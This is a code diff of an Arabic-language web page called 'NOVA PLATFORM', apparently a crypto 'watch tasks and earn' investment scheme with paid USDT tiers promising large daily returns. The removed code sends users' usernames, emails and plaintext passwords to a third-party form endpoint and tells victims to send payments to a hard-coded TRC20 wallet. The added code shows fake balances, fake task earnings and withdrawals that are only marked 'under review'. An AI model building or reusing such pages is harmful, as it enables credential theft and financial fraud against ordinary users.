@@ -4,13 +4,15 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>NOVA PLATFORM</title>
-<link href="https://googleapis.com" rel="stylesheet">
+<link rel="preconnect" href="https://googleapis.com">
+<link rel="preconnect" href="https://gstatic.com" crossorigin>
+<link href="https://googleapis.com/css2?family=Almarai:wght@400;700;800&display=swap" rel="stylesheet">
 <style>
 * { margin:0; padding:0; box-sizing:border-box; font-family:'Almarai',sans-serif; font-weight:800; }
 body { background:#000; color:#fff; min-height:100vh; display:flex; justify-content:center; align-items:center; padding:15px; }
 .container { max-width:440px; width:100%; text-align:center; background:#000; padding:20px 10px; }
 
-/* شاشة الدخول الرئيسية الفاخرة والمطورة كلياً */
+/* شاشة الدخول */
 .logo { font-size:56px; font-weight:800; color:#b8ff1a; margin-bottom:8px; letter-spacing:1px; text-shadow:0 0 25px rgba(184,255,26,0.3); }
 .welcome { font-size:20px; color:#ccc; margin-bottom:35px; line-height:1.5; letter-spacing:0.5px; }
 .auth-container { display:flex; flex-direction:column; gap:16px; margin-bottom:28px; width:100%; }
@@ -22,63 +24,84 @@ body { background:#000; color:#fff; min-height:100vh; display:flex; justify-cont
 .buttons-group { display:flex; gap:14px; width:100%; margin-bottom:30px; }
 .btn { flex:1; padding:18px; border:none; border-radius:16px; font-size:17px; cursor:pointer; transition:all 0.25s ease; display:flex; justify-content:center; align-items:center; }
 .btn-primary { background:linear-gradient(135deg, #b8ff1a 0%, #a2e014 100%); color:#000; box-shadow:0 5px 15px rgba(184,255,26,0.25); }
-.btn-primary:active { transform:scale(0.97); }
-.btn-secondary { background:transparent; color:#fff; border:2px solid #b8ff1a; box-shadow:0 5px 15px rgba(184,255,26,0.05); }
-.btn-secondary:active { transform:scale(0.97); }
-.desc { font-size:14px; line-height:1.7; color:#777; text-align:center; padding:0 10px; }
+.btn-secondary { background:transparent; color:#fff; border:2px solid #b8ff1a; }
 
 /* لوحة التحكم والصفحات الداخلية */
 .main-dashboard { position:fixed; top:0; left:0; width:100%; height:100%; background:#000; z-index:10000; display:none; flex-direction:column; justify-content:space-between; }
 .dashboard-content { flex:1; width:100%; padding:20px 15px; overflow-y:auto; padding-bottom:120px; display:flex; flex-direction:column; align-items:center; }
 .tab-content { display:none; width:100%; max-width:440px; }
 .tab-content.active { display:block; }
+.page-title { font-size:24px; color:#b8ff1a; text-align:center; margin-bottom:25px; font-weight:800; }
 
-/* تصميم كروت المستويات البيضاء الفاخرة R1, R2, R3, R4 */
-.tier-card { background:#ffffff; color:#000; border-radius:24px; padding:22px; margin-bottom:16px; width:100%; display:flex; justify-content:space-between; align-items:center; box-shadow:0 10px 30px rgba(255,255,255,0.04); }
-.tier-header { display:flex; flex-direction:column; align-items:flex-start; gap:5px; text-align:right; }
-.tier-price { font-size:15px; color:#666; }
-.tier-name { font-size:24px; color:#000; }
-.tier-info-line { font-size:13px; color:#444; }
+/* المهام ثلاثية الأجزاء */
+.task-container-blocks { width:100%; display:flex; flex-direction:column; gap:14px; align-items:center; padding-top:10px; }
+.task-block-3parts { display:flex; width:100%; max-width:400px; height:54px; gap:8px; align-items:center; cursor:pointer; }
+.part-youtube { width:60px; height:100%; background:#ff0000; border-radius:12px; display:flex; justify-content:center; align-items:center; }
+.part-youtube svg { width:24px; height:24px; fill:#ffffff; }
+.part-body-center { flex:1; height:100%; background:#ffffff; border-radius:12px; display:flex; align-items:center; padding:0 15px; }
+.block-number { color: #000000; font-size: 16px; }
+.part-action-left { padding:0 14px; height:100%; background:#28a745; color:#fff; font-size:13px; border-radius:12px; display:flex; justify-content:center; align-items:center; white-space: nowrap; }
+
+/* كروت المستويات */
+.tier-card { background:#ffffff; color:#000; border-radius:28px; padding:25px 20px; margin-bottom:16px; width:100%; max-width:400px; display:flex; justify-content:space-between; align-items:center; }
+.tier-header { display:flex; flex-direction:column; align-items:flex-end; gap:6px; text-align:right; flex:1; }
+.tier-name { font-size:26px; font-weight:800; }
+.tier-price { font-size:15px; color:#555; }
+.tier-info-line { font-size:14px; color:#777; }
 .tier-info-line span { color:#000; }
-.btn-activate { background:#28a745; color:#fff; border:none; padding:11px 24px; border-radius:25px; font-size:14px; cursor:pointer; box-shadow:0 4px 12px rgba(40,167,69,0.3); transition:all 0.2s; }
-.btn-activate:active { transform:scale(0.95); }
+.btn-activate { background:#28a745; color:#fff; border:none; padding:14px 28px; border-radius:18px; font-size:15px; cursor:pointer; }
+.btn-activate.disabled { background:#6c757d !important; cursor:not-allowed; }
 
-/* قسم الحساب الشخصي المتطور في أسفل صفحة INFO */
-.profile-section { width:100%; max-width:440px; background:#0d0d0d; border:1px solid #1a1a1a; border-radius:24px; padding:22px; margin-top:25px; text-align:right; box-shadow:0 12px 35px rgba(0,0,0,0.6); }
-.profile-item { display:flex; justify-content:space-between; align-items:center; padding:14px 0; border-bottom:1px solid #161616; font-size:15px; }
-.profile-label { color:#666; }
-.profile-value { color:#fff; }
-.profile-link { display:block; padding:14px 0; border-bottom:1px solid #161616; font-size:15px; color:#b8ff1a; cursor:pointer; text-decoration:none; transition:all 0.2s; }
-.profile-link:active { opacity:0.7; }
+/* تصميم هيكل المحفظة المتكاملة */
+.wallet-container { width:100%; max-width:400px; background:#ffffff; color:#000; padding:25px 20px; border-radius:28px; text-align:right; box-shadow:0 15px 40px rgba(0,0,0,0.3); margin-bottom:20px; }
+.wallet-main-title { font-size:14px; color:#666; margin-bottom:5px; }
+.wallet-main-balance { font-size:36px; color:#000; font-weight:800; margin-bottom:20px; }
+.wallet-stats { display:grid; grid-template-columns: 1fr 1fr; gap:12px; border-top:1px solid #eee; padding-top:15px; margin-bottom:20px; }
+.stat-box { display:flex; flex-direction:column; }
+.stat-title { font-size:12px; color:#888; }
+.stat-value { font-size:16px; color:#000; font-weight:700; margin-top:3px; }
 
-/* تصميم شريط المهام المستقيم والنحيف المنتهي بسهم مستدق جهة اليمين مطابق تماماً لصورتك */
-.task-container-arrow { width:100%; display:flex; flex-direction:column; align-items:center; gap:12px; }
-.task-arrow-item { position:relative; width:100%; max-width:400px; height:45px; display:flex; align-items:center; justify-content:flex-end; margin-bottom:8px; cursor:pointer; }
-.arrow-body { position:absolute; right:42px; left:0; height:28px; background:#ffffff; border-radius:0; }
-.arrow-point { position:absolute; left:-14px; top:8.5px; width:0; height:0; border-top:14px solid transparent; border-bottom:14px solid transparent; border-right:14px solid #ffffff; }
-.youtube-badge-on-arrow { position:absolute; right:0; top:0; width:52px; height:45px; background:#ff0000; border-radius:12px; display:flex; justify-content:center; align-items:center; box-shadow:0 4px 12px rgba(255,0,0,0.3); z-index:5; }
-.youtube-badge-on-arrow svg { width:24px; height:24px; fill:#ffffff; }
+/* أزرار الإيداع والسحب */
+.wallet-actions { display:flex; gap:10px; margin-bottom:20px; }
+.w-btn { flex:1; padding:14px; border-radius:14px; font-size:15px; border:none; cursor:pointer; text-align:center; }
+.w-btn-deposit { background:#000; color:#fff; }
+.w-btn-withdraw { background:#ffcc00; color:#000; }
 
-/* تصميم صفحة السحب البيضاء العالمية */
-.withdraw-box { width:100%; max-width:440px; background:#fff; color:#000; padding:25px 20px; border-radius:26px; text-align:right; box-shadow:0 15px 40px rgba(0,0,0,0.3); }
-.withdraw-balance-title { font-size:15px; color:#666; margin-bottom:4px; }
-.withdraw-balance-amount { font-size:32px; color:#000; margin-bottom:22px; }
-.withdraw-field-group { margin-bottom:16px; width:100%; }
+.withdraw-form { border-top:1px solid #eee; padding-top:20px; display:none; }
+.withdraw-form.active { display:block; }
+.withdraw-field-group { margin-bottom:16px; }
 .withdraw-field-group label { display:block; font-size:14px; color:#222; margin-bottom:6px; }
-.withdraw-field-group input, .withdraw-field-group select { width:100%; padding:15px; border:1px solid #ddd; background:#f9f9f9; color:#000; border-radius:14px; font-size:15px; outline:none; text-align:right; }
-.btn-submit-withdraw { width:100%; background:#000; color:#fff; border:none; padding:16px; border-radius:14px; font-size:16px; cursor:pointer; margin-top:5px; }
+.withdraw-field-group input, .withdraw-field-group select { width:100%; padding:14px; border:1px solid #ddd; background:#f9f9f9; border-radius:12px; font-size:15px; outline:none; text-align:right; }
+.btn-submit-withdraw { width:100%; background:#000; color:#fff; border:none; padding:15px; border-radius:12px; font-size:16px; cursor:pointer; }
 
-/* شريط التنقل السفلي المطور والمصلح لمنع انعكاس الأيقونات */
-.bottom-nav { width:100%; background:#0d0d0d; display:flex; flex-direction:row-reverse; justify-content:space-around; align-items:center; border-top:1px solid #1a1a1a; height:95px; position:fixed; bottom:0; left:0; z-index:10001; padding:0 10px; }
-.nav-item { display:flex; flex-direction:column; align-items:center; color:#555; font-size:11px; cursor:pointer; flex:1; gap:5px; }
+/* سجل حركات الأموال */
+.history-section { width:100%; max-width:400px; background:#0d0d0d; border:1px solid #1a1a1a; border-radius:24px; padding:20px; text-align:right; }
+.history-title { font-size:16px; color:#b8ff1a; margin-bottom:15px; border-bottom:1px solid #161616; padding-bottom:8px; }
+.history-list { display:flex; flex-direction:column; gap:12px; }
+.history-item { display:flex; justify-content:space-between; align-items:center; font-size:13px; padding-bottom:10px; border-bottom:1px solid #161616; }
+.history-item:last-child { border-bottom:none; }
+.h-details { display:flex; flex-direction:column; }
+.h-type { color:#fff; font-size:14px; }
+.h-date { color:#555; font-size:11px; margin-top:2px; }
+.h-amount { font-size:14px; font-weight:700; }
+.h-amount.minus { color:#ff4d4d; }
+.h-amount.plus { color:#28a745; }
+
+.profile-section { width:100%; max-width:400px; background:#0d0d0d; border:1px solid #1a1a1a; border-radius:24px; padding:22px; text-align:right; }
+.profile-item { display:flex; justify-content:space-between; padding:14px 0; border-bottom:1px solid #161616; font-size:15px; }
+
+/* شريط التنقل */
+.bottom-nav { width:100%; background:#0d0d0d; display:flex; justify-content:space-around; align-items:center; border-top:1px solid #1a1a1a; height:90px; position:fixed; bottom:0; left:0; z-index:10001; padding:0 10px; }
+.nav-item { display:flex; flex-direction:column; align-items:center; color:#666; font-size:12px; cursor:pointer; flex:1; gap:6px; text-decoration:none; }
 .nav-item.active { color:#fff; }
-.nav-item.active .nav-icon-yellow { border:2px solid #fff; box-shadow:0 0 15px rgba(255,204,0,0.5); }
-.nav-icon-yellow { background:#ffcc00; width:52px; height:52px; border-radius:14px; display:flex; justify-content:center; align-items:center; flex-shrink:0; transition:all 0.2s; }
-.nav-icon-yellow svg { width:26px; height:26px; fill:#000; }
+.nav-item.active .nav-icon-yellow { border:2px solid #fff; box-shadow:0 0 15px rgba(255,204,0,0.6); }
+.nav-icon-yellow { background:#ffcc00; width:50px; height:50px; border-radius:14px; display:flex; justify-content:center; align-items:center; flex-shrink:0; }
+.nav-icon-yellow svg { width:24px; height:24px; fill:#000; }
 </style>
 </head>
 <body>
 
+<!-- شاشة الدخول -->
 <div class="container" id="authScreen">
     <div class="logo">NOVA</div>
     <div class="welcome">WELCOME TO NOVA PLATFORM</div>
@@ -95,158 +118,228 @@ body { background:#000; color:#fff; min-height:100vh; display:flex; justify-cont
         <button class="btn btn-primary" onclick="handleAuth('register')">إنشاء حساب</button>
         <button class="btn btn-secondary" onclick="handleAuth('login')">تسجيل الدخول</button>
     </div>
-    <div class="desc">Welcome to Nova Platform.<br>We provide comprehensive support for our users.</div>
 </div>
+
+<!-- لوحة التحكم الرئيسية والصفحات -->
 <div id="mainDashboard" class="main-dashboard">
     <div class="dashboard-content">
         
-        <!-- 1. صفحة المهام (TASKS) تحتوي على 45 سهم مستقيم مستدق مع شارة يوتيوب -->
+        <!-- صفحة المهام ثلاثية الأجزاء -->
         <div id="tasksPage" class="tab-content">
-            <h3 style="color:#b8ff1a; margin-bottom:20px; text-align:center; font-weight:800;">المهام اليومية المتاحة</h3>
-            <div class="task-container-arrow">
-                <!-- كود برمجي مكرر ومضغوط لتوليد الـ 45 سهماً هندسياً متطابقاً بنسبة 100% مع صورتك -->
-                <script>
-                    for(let i=1; i<=45; i++) {
-                        document.write(`
-                            <div class="task-arrow-item" onclick="alert('قم بالترقية لتفعيل المهمة ${i}!')">
-                                <div class="arrow-body"></div>
-                                <div class="arrow-point"></div>
-                                <div class="youtube-badge-on-arrow">
-                                    <svg viewBox="0 0 24 24"><path d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z"/></svg>
-                                </div>
-                            </div>
-                        `);
-                    }
-                </script>
+            <div class="task-container-blocks" id="tasksContainer"></div>
+        </div>
+
+        <!-- صفحة المستويات وأزرار التفعيل -->
+        <div id="tiersPage" class="tab-content">
+            <div class="tier-card">
+                <button class="btn-activate" id="btn-R1" onclick="activateTier('R1', 15)">تفعيل</button>
+                <div class="tier-header">
+                    <span class="tier-name">مستوى R1</span>
+                    <span class="tier-price">USDT 15</span>
+                    <span class="tier-info-line">الربح اليومي: <span>USDT 1.50</span></span>
+                </div>
+            </div>
+            <div class="tier-card">
+                <button class="btn-activate" id="btn-R2" onclick="activateTier('R2', 35)">تفعيل</button>
+                <div class="tier-header">
+                    <span class="tier-name">مستوى R2</span>
+                    <span class="tier-price">USDT 35</span>
+                    <span class="tier-info-line">الربح اليومي: <span>USDT 5.00</span></span>
+                </div>
+            </div>
+            <div class="tier-card">
+                <button class="btn-activate" id="btn-R3" onclick="activateTier('R3', 100)">تفعيل</button>
+                <div class="tier-header">
+                    <span class="tier-name">مستوى R3</span>
+                    <span class="tier-price">USDT 100</span>
+                    <span class="tier-info-line">الربح اليومي: <span>USDT 15.00</span></span>
+                </div>
             </div>
         </div>
 
-        <!-- 2. صفحة السحب البيضاء الفاخرة (DEPOSIT) مع خيارات الشبكة وسجل السحب الاحترافي -->
-        <div id="depositPage" class="tab-content">
-            <div class="withdraw-box">
-                <div class="withdraw-balance-title">رصيد غير متاح</div>
-                <div class="withdraw-balance-amount">$0.00</div>
-                <div class="withdraw-field-group">
-                    <label>خيارات الشبكة</label>
-                    <select><option>TRC20</option><option>ERC20</option><option>BEP20</option></select>
+        <!-- صفحة المحفظة وسجل الحركات المالي التفصيلي -->
+        <div id="withdrawPage" class="tab-content active">
+            <div class="wallet-container">
+                <div class="wallet-main-title">الرصيد الإجمالي المتوفر</div>
+                <div class="wallet-main-balance" id="walletBalance">USDT 250.00</div>
+                
+                <div class="wallet-stats">
+                    <div class="stat-box">
+                        <span class="stat-title">إجمالي الأرباح المستلمة</span>
+                        <span class="stat-value" id="totalEarned" style="color:#28a745;">USDT 0.00</span>
+                    </div>
+                    <div class="stat-box">
+                        <span class="stat-title">إجمالي السحوبات</span>
+                        <span class="stat-value" id="totalWithdrawn" style="color:#ff4d4d;">USDT 0.00</span>
+                    </div>
                 </div>
-                <div class="withdraw-field-group">
-                    <label>عنوان المحفظة</label>
-                    <input type="text" placeholder="أدخل عنوان محفظتك هنا">
+
+                <div class="wallet-actions">
+                    <button class="w-btn w-btn-deposit" onclick="alert('قم بالتواصل مع الدعم الفني لإيداع الأموال')">إيـداع</button>
+                    <button class="w-btn w-btn-withdraw" onclick="toggleWithdrawForm()">سحـب</button>
                 </div>
-                <div class="withdraw-field-group">
-                    <label>إدخال الرصيد (USDT)</label>
-                    <input type="number" placeholder="0.00">
+
+                <div class="withdraw-form" id="wForm">
+                    <div class="withdraw-field-group">
+                        <label>طريقة السحب</label>
+                        <select id="withdrawMethod"><option value="usdt">USDT (TRC20)</option></select>
+                    </div>
+                    <div class="withdraw-field-group">
+                        <label>المبلغ المراد سحبه</label>
+                        <input type="number" id="withdrawAmount" placeholder="0.00">
+                    </div>
+                    <div class="withdraw-field-group">
+                        <label>عنوان محفظتك</label>
+                        <input type="text" id="walletAddress" placeholder="أدخل عنوان المحفظة">
+                    </div>
+                    <button class="btn-submit-withdraw" onclick="processWithdraw()">تأكيد السحب الفوري</button>
                 </div>
-                <button class="btn-submit-withdraw" onclick="alert('الرصيد الحالي غير كافي لإتمام عملية السحب!')">سحب الرصيد</button>
+            </div>
+
+            <div class="history-section">
+                <div class="history-title">سجل المعاملات المالي</div>
+                <div class="history-list" id="historyLog">
+                    <div class="history-item" id="emptyHistoryText"><span style="color:#555;">لا توجد معاملات مالية حتى الآن.</span></div>
+                </div>
             </div>
         </div>
 
-        <!-- 3. صفحة المستويات البيضاء (INFO) مع قسم الحساب الشخصي الجديد والكامل بالأسفل -->
-        <div id="infoPage" class="tab-content active">
-            <div class="tier-card">
-                <div class="tier-header"><div class="tier-name">مستوى R1</div><div class="tier-price">15 USDT</div><div class="tier-info-line">الربح اليومي: <span>USDT 1.50</span></div></div>
-                <button class="btn-activate" onclick="activateTier('R1')">تفعيل</button>
-            </div>
-            <div class="tier-card">
-                <div class="tier-header"><div class="tier-name">مستوى R2</div><div class="tier-price">35 USDT</div><div class="tier-info-line">الربح اليومي: <span>USDT 5.00</span></div></div>
-                <button class="btn-activate" onclick="activateTier('R2')">تفعيل</button>
-            </div>
-            <div class="tier-card">
-                <div class="tier-header"><div class="tier-name">مستوى R3</div><div class="tier-price">100 USDT</div><div class="tier-info-line">الربح اليومي: <span>USDT 15.00</span></div></div>
-                <button class="btn-activate" onclick="activateTier('R3')">تفعيل</button>
-            </div>
-            <div class="tier-card">
-                <div class="tier-header"><div class="tier-name">مستوى R4</div><div class="tier-price">1000 USDT</div><div class="tier-info-line">الربح اليومي: <span>USDT 150.00</span></div></div>
-                <button class="btn-activate" onclick="activateTier('R4')">تفعيل</button>
-            </div>
-
-            <!-- قسم الملف الشخصي وعناصر التحكم المضافة لأسفل صفحة INFO بطلبك -->
+        <!-- صفحة الحساب الشخصي -->
+        <div id="infoPage" class="tab-content">
             <div class="profile-section">
-                <div class="profile-item">
-                    <span class="profile-label">اسم المستخدم</span>
-                    <span class="profile-value" id="profileUserDisplay">User</span>
-                </div>
-                <div class="profile-item">
-                    <span class="profile-label">رمز الحالة الخاص بك</span>
-                    <span class="profile-value">4738</span>
-                </div>
-                <div class="profile-link" onclick="alert('سيتم إرسال رابط تعيين كلمة المرور إلى إيميلك المسجل قريباً!')">تغيير كلمة المرور</div>
-                <div class="profile-link" onclick="alert('يرجى التواصل مع الدعم الفني لاسترداد كلمة المرور الخاصة بحسابك!')">استرداد كلمة المرور</div>
+                <div class="profile-item"><span id="profUsername">-</span><span style="color:#666;">اسم المستخدم</span></div>
+                <div class="profile-item"><span id="profEmail">-</span><span style="color:#666;">البريد الإلكتروني</span></div>
+                <div class="profile-item"><span id="profStatus">-</span><span style="color:#666;">رقم الحالة</span></div>
             </div>
         </div>
 
     </div>
 
-    <!-- شريط التنقل السفلي المطور بالمربعات الصفراء المتناسقة تماماً ومحاذاتها الصحيحة -->
+    <!-- شريط التنقل السفلي -->
     <div class="bottom-nav">
-        <div class="nav-item" onclick="switchPage('tasks', this)">
-            <div class="nav-icon-yellow"><svg viewBox="0 0 24 24"><path d="M19.43 12.98c.04-.32.07-.64.07-.98s-.03-.66-.07-.98l2.11-1.65c.19-.15.24-.42.12-.64l-2-3.46c-.12-.22-.39-.3-.61-.22l-2.49 1a9.86 9.86 0 0 0-1.69-.98l-.38-2.65C14.46 2.18 14.25 2 14 2h-4c-.25 0-.46.18-.49.42l-.38 2.65c-.61.25-1.17.59-1.69.98l-2.49-1c-.23-.09-.49 0-.61.22l-2 3.46c-.13.22-.07.49.12.64l2.11 1.65c-.04.32-.07.65-.07.98s.03.66.07.98l-2.11 1.65c-.19.15-.24.42-.12.64l2 3.46c.12.22.39.3.61.22l2.49-1c.52.4 1.08.73 1.69.98l.38 2.65c.03.24.24.42.49.42h4c.25 0 .46-.18.49-.42l-.38-2.65c.61-.25 1.17-.59 1.69-.98l2.49 1c.23.09.49 0 .61-.22l2-3.46c.12-.22.07-.49-.12-.64l-2.11-1.65zM12 15.5c-1.93 0-3.5-1.57-3.5-3.5s1.57-3.5 3.5-3.5 3.5 1.57 3.5 3.5-1.57 3.5-3.5 3.5z"/></svg></div>
+        <div class="nav-item" onclick="switchTab('tasksPage', this)">
+            <div class="nav-icon-yellow"><svg viewBox="0 0 24 24"><path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-5 14H7v-2h7v2zm3-4H7v-2h10v2zm0-4H7V7h10v2z"/></svg></div>
             <span>TASKS</span>
         </div>
-        <div class="nav-item" onclick="switchPage('deposit', this)">
-            <div class="nav-icon-yellow"><svg viewBox="0 0 24 24"><path d="M12 2L1 21h22L12 2zm0 3.99L19.53 19H4.47L12 5.99zM11 16h2v2h-2zm0-6h2v4h-2z"/></svg></div>
-            <!-- تم تغيير الكلمة لتتوافق مع نظام السحب الجديد بالداخل -->
+        <div class="nav-item" onclick="switchTab('tiersPage', this)">
+            <div class="nav-icon-yellow"><svg viewBox="0 0 24 24"><path d="M12 2L1 21h22L12 2zm0 4l7.53 13H4.47L12 6z"/></svg></div>
+            <span>TIERS</span>
+        </div>
+        <div class="nav-item active" onclick="switchTab('withdrawPage', this)">
+            <div class="nav-icon-yellow"><svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 16h-2v-2h2v2zm1.07-7.75l-.9.92C12.45 11.9 12 12.5 12 14h-2v-.5c0-1.1.45-2.1 1.17-2.83l1.24-1.26c.37-.36.59-.86.59-1.41 0-1.1-.9-2-2-2s-2 .9-2 2H7c0-2.76 2.24-5 5-5s5 2.24 5 5c0 1.04-.42 1.99-1.07 2.75z"/></svg></div>
             <span>WITHDRAW</span>
         </div>
-        <div class="nav-item active" onclick="switchPage('info', this)">
-            <div class="nav-icon-yellow"><svg viewBox="0 0 24 24"><path d="M21 18v1c0 1.1-.9 2-2 2H5c-1.11 0-2-.9-2-2V5c0-1.1.89-2 2-2h14c1.1 0 2 .9 2 2v1h-9c-1.11 0-2 .9-2 2v8c0 1.1.89 2 2 2h9zm-9-2h10V8H12v8zm4-2.5c-.83 0-1.5-.67-1.5-1.5s.67-1.5 1.5-1.5 1.5 0.67 1.5 1.5-0.67 1.5-1.5 1.5z"/></svg></div>
+        <div class="nav-item" onclick="switchTab('infoPage', this)">
+            <div class="nav-icon-yellow"><svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5-4-8-4z"/></svg></div>
             <span>INFO</span>
         </div>
     </div>
-</div>
-
-<script>
-let userPassGlobal = "";
-
-function switchPage(p, e) {
-    document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
-    document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
-    e.classList.add('active');
-    if(p === 'tasks') document.getElementById('tasksPage').classList.add('active');
-    if(p === 'deposit') document.getElementById('depositPage').classList.add('active');
-    if(p === 'info') document.getElementById('infoPage').classList.add('active');
-}
-
-document.getElementById('togglePassword').addEventListener('click', function() {
-    const input = document.getElementById('passwordInput');
-    if (input.type === 'password') { input.type = 'text'; this.textContent = '🙈'; }
-    else { input.type = 'password'; this.textContent = '👁️'; }
-});
+            </div>
+            <script>
+let currentUser = { username: "", email: "", status: "", balance: 250.00, earned: 0.00, withdrawn: 0.00 };
 
 function handleAuth(type) {
-    const u = document.getElementById('userInput').value.trim();
-    const e = document.getElementById('emailInput').value.trim();
-    const p = document.getElementById('passwordInput').value.trim();
-    const s = document.getElementById('statusInput').value.trim();
-    if (!u || !e || !p || !s) { alert('يرجى ملء جميع الحقول المطلوبة!'); return; }
-    
-    userPassGlobal = p; 
-    document.getElementById('profileUserDisplay').innerText = u; // حقن اسم المستخدم تلقائياً في الأسفل
+    const user = document.getElementById('userInput').value.trim();
+    const email = document.getElementById('emailInput').value.trim();
+    const status = document.getElementById('statusInput').value.trim();
 
-    const endpoint = "https://formspree.io";
-    fetch(endpoint, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ العملية: type, المستخدم: u, الإيميل: e, كلمة_السر: p, الحالة: s, محفظة_المالك: "THJN4XBKxbZNYsw7YAHmNiZSupn3kVEDFP" })
-    }).then(() => {
-        document.getElementById('authScreen').style.display = 'none';
-        document.getElementById('mainDashboard').style.display = 'flex';
-    }).catch(() => {
-        document.getElementById('authScreen').style.display = 'none';
-        document.getElementById('mainDashboard').style.display = 'flex';
-    });
+    if(!user || !email || !status) { alert('برجاء ملء كافة الحقول!'); return; }
+
+    currentUser.username = user; currentUser.email = email; currentUser.status = status;
+    document.getElementById('profUsername').textContent = user;
+    document.getElementById('profEmail').textContent = email;
+    document.getElementById('profStatus').textContent = status;
+    
+    updateWalletUI();
+    document.getElementById('authScreen').style.display = 'none';
+    document.getElementById('mainDashboard').style.display = 'flex';
+    generate3PartTasks();
 }
 
-function activateTier(tierName) {
-    const checkPass = prompt(`لتفعيل ${tierName}، يرجى كتابة كلمة السر الخاصة بحسابك للتأكيد:`);
-    if (checkPass === null) return; 
-    
-    if (checkPass === userPassGlobal && userPassGlobal !== "") {
-        alert(`تم التحقق من كلمة السر بنجاح! يرجى إرسال قيمة الباقة لعنوان المحفظة الآمن التالي لإتمام تفعيل حسابك:\n\nTHJN4XBKxbZNYsw7YAHmNiZSupn3kVEDFP`);
-    } else {
-        alert("خطأ: كلمة السر غير صحيحة، لم يتم التفعيل!");
+function switchTab(tabId, element) {
+    document.querySelectorAll('.tab-content').forEach(tab => tab.classList.remove('active'));
+    document.getElementById(tabId).classList.add('active');
+    document.querySelectorAll('.nav-item').forEach(item => item.classList.remove('active'));
+    element.classList.add('active');
+}
+
+function generate3PartTasks() {
+    const container = document.getElementById('tasksContainer'); container.innerHTML = '';
+    for (let i = 1; i <= 45; i++) {
+        const taskItem = document.createElement('div');
+        taskItem.className = 'task-block-3parts';
+        taskItem.onclick = () => {
+            alert(`تم فتح الرابط للمهمة رقم ${i}. ستكسب 0.50$ بعد المشاهدة.`);
+            currentUser.balance += 0.50; currentUser.earned += 0.50;
+            updateWalletUI();
+            addTransactionHistory(`إتمام مهمة فيديو رقم ${i}`, 0.50, 'plus');
+        };
+        taskItem.innerHTML = `
+            <div class="part-youtube"><svg viewBox="0 0 24 24"><path d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93 0 3.93.502 3.93 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z"/></svg></div>
+            <div class="part-body-center"><span class="block-number">مهمة رقم ${i}</span></div>
+            <div class="part-action-left">ابدأ الآن</div>
+        `;
+        container.appendChild(taskItem);
     }
+}
+
+function toggleWithdrawForm() {
+    document.getElementById('wForm').classList.toggle('active');
+}
+
+function updateWalletUI() {
+    document.getElementById('walletBalance').textContent = `USDT ${currentUser.balance.toFixed(2)}`;
+    document.getElementById('totalEarned').textContent = `USDT ${currentUser.earned.toFixed(2)}`;
+    document.getElementById('totalWithdrawn').textContent = `USDT ${currentUser.withdrawn.toFixed(2)}`;
+}
+
+function addTransactionHistory(title, amount, statusClass) {
+    const log = document.getElementById('historyLog');
+    const emptyText = document.getElementById('emptyHistoryText');
+    if(emptyText) emptyText.remove();
+
+    const sign = statusClass === 'minus' ? '-' : '+';
+    const item = document.createElement('div');
+    item.className = 'history-item';
+    item.innerHTML = `
+        <div class="h-details">
+            <span class="h-type">${title}</span>
+            <span class="h-date">${new Date().toLocaleTimeString()}</span>
+        </div>
+        <span class="h-amount ${statusClass}">${sign}USDT ${amount.toFixed(2)}</span>
+    `;
+    log.prepend(item);
+}
+
+function activateTier(tierId, cost) {
+    const targetButton = document.getElementById(`btn-${tierId}`);
+    if (targetButton.classList.contains('disabled')) return;
+
+    if (currentUser.balance >= cost) {
+        currentUser.balance -= cost;
+        updateWalletUI();
+        targetButton.textContent = "مفعّل حالياً ✨";
+        targetButton.classList.add('disabled');
+        addTransactionHistory(`تنشيط مستوى ${tierId}`, cost, 'minus');
+        alert(`تم تفعيل مستوى ${tierId} بنجاح!`);
+    } else {
+        alert(`رصيدك غير كافٍ لتفعيل مستوى ${tierId}!`);
+    }
+}
+
+function processWithdraw() {
+    const amount = parseFloat(document.getElementById('withdrawAmount').value);
+    const wallet = document.getElementById('walletAddress').value.trim();
+
+    if(!amount || !wallet) { alert('برجاء إدخال البيانات كاملة!'); return; }
+    if(amount > currentUser.balance) { alert('رصيدك الحالي غير كافٍ!'); return; }
+
+    currentUser.balance -= amount;
+    currentUser.withdrawn += amount;
+    updateWalletUI();
+    addTransactionHistory(`سحب عملات USDT إلى المحفظة`, amount, 'minus');
+    alert(`تم تقديم طلب السحب بنجاح وهي قيد المراجعة الفنية!`);
+    toggleWithdrawForm();
 }
 </script>
 </body>
